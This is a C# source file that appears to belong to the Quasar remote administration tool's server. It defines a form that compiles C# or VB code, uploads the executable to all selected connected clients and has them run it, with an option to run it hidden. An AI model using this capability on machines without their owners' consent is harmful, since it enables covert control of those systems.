using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Quasar.Common.IO;
using Quasar.Common.Messages;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{

    public partial class FrmExecuteCode : Form
    {

        Client[] clients;

        public FrmExecuteCode(Client[] clients)
        {
            InitializeComponent();
            this.clients = clients;
            fctbCSharp.Text = Properties.Resources.CodeExecutor_CSharp;
            fctbVB.Text = Properties.Resources.CodeExecutor_VB;
            Text += " - " + clients.Length + " client(s)";
        }

        private void btnResetCode_Click(object sender, System.EventArgs e)
        {
            switch (tcLanguage.SelectedIndex)
            {
                case 0: // C#
                    fctbCSharp.Text = Properties.Resources.CodeExecutor_CSharp;
                    break;
                case 1: // VB
                    fctbVB.Text = Properties.Resources.CodeExecutor_VB;
                    break;
            }
        }

        private void btnExecuteCode_Click(object sender, System.EventArgs e)
        {
            cbHidden.Enabled = false;
            btnExecuteCode.Enabled = false;
            lblStatus.Text = "Compiling...";
            new Thread(ExecuteThread).Start();
        }

        private void ExecuteThread()
        {

            // get output file
            string output = new Random().Next(11111, 55555).ToString() + ".exe";

            // call compile
            CompilerResults result = CompileCode(output);

            // check for errors
            if (result.Errors.Count > 0)
            {
                string message = "Found " + result.Errors.Count + " errors!\n\n";
                foreach (CompilerError error in result.Errors)
                {
                    message += "=== ERROR " + error.ErrorNumber + " ===\n";
                    message += "-- Line #" + error.Line + "\n";
                    message += error.ErrorText + "\n\n";
                }
                EndExecution(output, message);
                return;
            }

            // split file into pieces for transfer
            int clientNumber = 1;
            foreach (Client client in clients)
            {

                Invoke((MethodInvoker)(() =>
                {
                    lblStatus.Text = "Uploading to client #" + clientNumber + "...";
                }));

                FileSplitLegacy srcFile = new FileSplitLegacy(output);
                if (srcFile.MaxBlocks < 0)
                {
                    EndExecution(output, string.Format("Error reading file: {0}", srcFile.LastError));
                    return;
                }

                // generate unique transfer id
                int id = FileTransfer.GetRandomTransferId();

                // upload each block
                for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                {
                    byte[] block;
                    if (srcFile.ReadBlock(currentBlock, out block))
                    {
                        client.SendBlocking(new DoUploadAndExecute
                        {
                            Id = id,
                            FileName = Path.GetFileName(output),
                            Block = block,
                            MaxBlocks = srcFile.MaxBlocks,
                            CurrentBlock = currentBlock,
                            RunHidden = cbHidden.Checked
                        });
                    }
                    else
                    {
                        EndExecution(output, string.Format("Error reading file: {0}", srcFile.LastError));
                        return;
                    }

                }

                clientNumber++;

            }

            EndExecution(output);

        }

        private void EndExecution(string file, string error = "")
        {
            Invoke((MethodInvoker)(() =>
            {
                if (File.Exists(file))
                    File.Delete(file);
                cbHidden.Enabled = true;
                btnExecuteCode.Enabled = true;
                lblStatus.Text = "Ready.";
                if (error != string.Empty)
                    MessageBox.Show(error, "Execution aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }));
        }

        private CompilerResults CompileCode(string outputPath)
        {

            // build references list
            int referenceCount = lbReferences.Items.Count;
            string[] references = new string[referenceCount];
            for (int i = 0; i < referenceCount; i++)
                references[i] = lbReferences.Items[i].ToString();

            // setup compiler params
            var parameters = new CompilerParameters(references, outputPath);
            parameters.GenerateExecutable = true;

            // compile
            int language = -1;
            Invoke((MethodInvoker)(() => { language = tcLanguage.SelectedIndex; }));
            switch (language)
            {
                case 0:
                    using (CSharpCodeProvider provider = new CSharpCodeProvider())
                        return provider.CompileAssemblyFromSource(parameters, new string[] { fctbCSharp.Text });
                case 1:
                    using (VBCodeProvider provider = new VBCodeProvider())
                        return provider.CompileAssemblyFromSource(parameters, new string[] { fctbVB.Text });
            }

            return null;

        }

        private void btnRemoveReference_Click(object sender, System.EventArgs e)
        {
            if (lbReferences.SelectedIndex != -1)
                lbReferences.Items.RemoveAt(lbReferences.SelectedIndex);
        }

        private void btnAddReference_Click(object sender, System.EventArgs e)
        {
            if (txtReference.Text != string.Empty)
                lbReferences.Items.Add(txtReference.Text);
        }

    }

}
